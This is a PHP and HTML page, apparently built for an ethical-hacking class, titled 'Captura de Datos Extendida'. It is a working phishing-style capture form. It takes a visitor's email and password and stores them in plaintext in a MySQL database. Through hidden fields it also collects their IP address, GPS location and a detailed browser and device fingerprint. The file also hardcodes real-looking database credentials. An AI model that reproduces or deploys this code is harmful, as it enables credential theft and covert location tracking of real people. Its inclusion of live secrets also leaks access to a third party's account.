<?php
// 🔧 MODIFICA ESTOS DATOS CON LOS DE TU CUENTA DE ALWAYS DATA
$host = "mysql-josuealonzo.alwaysdata.net";  // ejemplo: josuecamacho_mysql.alwaysdata.net
$user = "415758";
$pass = "Sonic0820@";
$dbname = "josuealonzo_hackingetico";

// Conexión a la base de datos
$conn = new mysqli($host, $user, $pass, $dbname);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Procesamiento del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST['correo'] ?? '';
    $contrasena = $_POST['password'] ?? '';
    $ip_cliente = $_SERVER['REMOTE_ADDR'];
    $user_agent_php = $_SERVER['HTTP_USER_AGENT'];
    $latitud = $_POST['lat'] ?? '';
    $longitud = $_POST['lon'] ?? '';
    $detalles_navegador = $_POST['info_navegador'] ?? '';

    // Combina User-Agent básico con info extendida
    $user_agent_completo = $user_agent_php . "\n\n" . $detalles_navegador;

    // Inserta los datos en la base
    $stmt = $conn->prepare("INSERT INTO datos (correo, contrasena, user_agent, ip_cliente, latitud, longitud) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $correo, $contrasena, $user_agent_completo, $ip_cliente, $latitud, $longitud);
    $stmt->execute();
    $stmt->close();

    echo "<p style='color:green;'>Datos enviados correctamente.</p>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Captura de Datos Extendida</title>
</head>
<body>
    <h2>Formulario de Captura</h2>
    <form id="capturaForm" method="post" onsubmit="return validarYEnviar();">
        <label for="correo">Correo:</label><br>
        <input type="email" id="correo" name="correo" required><br><br>

        <label for="password">Contraseña:</label><br>
        <input type="password" id="password" name="password" required><br><br>

        <!-- Campos ocultos para ubicación y datos del navegador -->
        <input type="hidden" id="lat" name="lat">
        <input type="hidden" id="lon" name="lon">
        <input type="hidden" id="info_navegador" name="info_navegador">

        <input type="submit" value="Enviar">
    </form>

    <script>
    let coordsObtenidas = false;
    let tiempoInicio = Date.now();

    function obtenerUbicacion(callback) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function (position) {
                document.getElementById("lat").value = position.coords.latitude;
                document.getElementById("lon").value = position.coords.longitude;
                coordsObtenidas = true;
                callback();
            }, function (error) {
                console.warn("No se pudo obtener la ubicación: " + error.message);
                callback(); // Continuar sin coords
            });
        } else {
            console.warn("Geolocalización no disponible.");
            callback(); // Continuar sin coords
        }
    }

    function getInfoAvanzada() {
        const tiempoActivo = Math.round((Date.now() - tiempoInicio) / 1000);
        const ram = navigator.deviceMemory || "Desconocida";
        const cpus = navigator.hardwareConcurrency || "Desconocido";
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const tipoConexion = connection ? connection.effectiveType : "Desconocida";

        return `
== Información Avanzada del Navegador ==
User-Agent: ${navigator.userAgent}
Idioma: ${navigator.language}
Plataforma: ${navigator.platform}
Nombre del navegador: ${navigator.appName}
Motor de renderizado: ${navigator.product}
Cookies habilitadas: ${navigator.cookieEnabled}
Resolución de pantalla: ${screen.width}x${screen.height}
RAM estimada: ${ram} GB
Núcleos de CPU: ${cpus}
Tipo de conexión: ${tipoConexion}
Tiempo activo en página: ${tiempoActivo} segundos
        `.trim();
    }

    function validarYEnviar() {
        document.getElementById("info_navegador").value = getInfoAvanzada();

        if (!coordsObtenidas) {
            obtenerUbicacion(function () {
                document.getElementById("capturaForm").submit();
            });
            return false;
        }

        return true;
    }
    </script>
</body>
</html>
